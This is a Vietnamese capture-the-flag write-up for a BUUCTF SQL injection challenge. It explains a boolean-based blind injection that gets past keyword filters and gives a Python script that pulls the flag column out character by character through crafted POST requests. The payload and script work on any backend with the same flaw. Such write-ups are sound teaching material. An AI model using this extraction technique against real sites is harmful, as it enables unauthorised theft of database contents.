Challenge cho ta 1 form để sumbit, và cho biết table, column là `flag`. Sau đó mình thử sumbit đại 

```
id = 1 ---> Hello, glzjin wants a girlfriend.
id = 2 --->  Do you want to be my girlfriend?
id = 3,4,..... ---> Error Occured When Fetch Result.
```
Bởi vì bài này có tag là sql nên mình thử fuzz một vài payload.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/840a05dd-5ea1-457b-a79e-f7ee2fe53e67)

Nhưng mà bị filter gần hết. Sau đó thì mình có thử boolean

```
1=1 ---> Hello, glzjin wants a girlfriend. /// 	select * from abc where id = 1 = 1 /// select * from xxx where id = 1 = TRUE;

1=2 ---> Error Occured When Fetch Result.
1=0 --->  Do you want to be my girlfriend? /// select * from abc where id = 1 = 0 /// select * from xxx where id = 1 = FALSE;
```

Bởi vì là trong SQL 1 là TRUE và 2 là FLASE. Như vậy khi mình nhập 1=1 có nghĩa là `1=TRUE` thì trả về `id=1`, còn với 1=0 nghĩa là `id=1=Fasle` nên trả về `id=2`.Bởi vì 2 chỉ là 1 số bình thường nên khi nhập `1=2` sẽ trả về lỗi

Payload:
`1=(ascii(substr((select(flag)from(flag)),1,1))=100)`

Kết quả trả về là ` Do you want to be my girlfriend?` là FALSE nên payload này đúng.

```python
import requests
s = requests.session()
url = "http://eac5836a-8b85-4734-8978-e7cac7166c02.node4.buuoj.cn:81/index.php"
pos = 0
flag = ''
while True:
    pos += 1
    for i in range(45, 127):
        payload = f"1=((ascii(substr((select(flag)from(flag)),{pos},1))={i}))"
        print("testing"+chr(i))
        r = s.post(url, data={'id':payload})
        if "glzjin " in r.text:
            flag+=chr(i) 
            break   
    else:
        break
print(flag)
```
![image](https://github.com/Llam-a/BUUCTF/assets/115911041/92e9ddbd-3955-4c45-89e9-91f4c139e290)
